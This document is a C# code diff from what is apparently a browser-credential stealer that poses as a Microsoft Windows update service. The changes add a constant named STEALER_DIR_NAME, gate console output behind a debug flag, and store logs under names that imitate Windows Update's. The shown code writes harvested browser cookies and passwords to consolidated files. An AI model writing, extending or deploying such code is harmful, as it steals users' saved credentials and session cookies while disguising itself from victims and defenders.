@@ -36,10 +36,10 @@ namespace Microsoft.UpdateService.Modules
         {
             try {
                 string line = $"[{DateTime.Now:HH:mm:ss}] [BROWSER] {msg}";
-                Console.WriteLine(line);
-                string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
+                if (Constants.DEBUG_MODE) Console.WriteLine(line);
+                string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Constants.APP_DATA_SUBDIR);
                 if (!Directory.Exists(logDir)) Directory.CreateDirectory(logDir);
-                string logPath = Path.Combine(logDir, "svc_debug.log");
+                string logPath = Path.Combine(logDir, Constants.LOG_FILE_NAME);
                 File.AppendAllText(logPath, line + Environment.NewLine);
             } catch { }
         }
@@ -49,10 +49,10 @@ namespace Microsoft.UpdateService.Modules
             var result = new BrowserResult();
             try
             {
-                string tempBase = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
+                string tempBase = Path.Combine(Path.GetTempPath(), Constants.STEALER_DIR_NAME);
                 if (!Directory.Exists(tempBase)) Directory.CreateDirectory(tempBase);
                 
-                string vOutputDir = Path.Combine(tempBase, "VOutput");
+                string vOutputDir = Path.Combine(tempBase, "VData");
                 if (Directory.Exists(vOutputDir)) try { Directory.Delete(vOutputDir, true); } catch { }
                 Directory.CreateDirectory(vOutputDir);
 
@@ -175,10 +175,10 @@ namespace Microsoft.UpdateService.Modules
                 }
  
                 if (totalCookies > 0)
-                    File.WriteAllText(Path.Combine(rootDir, "Vanguard_All_Cookies.json"), allCookies.ToString());
+                    File.WriteAllText(Path.Combine(rootDir, Constants.COOKIE_FILE_NAME), allCookies.ToString());
                 
                 if (totalPasswords > 0)
-                    File.WriteAllText(Path.Combine(rootDir, "Vanguard_All_Passwords.txt"), allPasswords.ToString());
+                    File.WriteAllText(Path.Combine(rootDir, Constants.PASSWORD_FILE_NAME), allPasswords.ToString());
             }
             catch (Exception ex) { Log($"[BROWSER] Consolidation error: {ex.Message}"); }
  
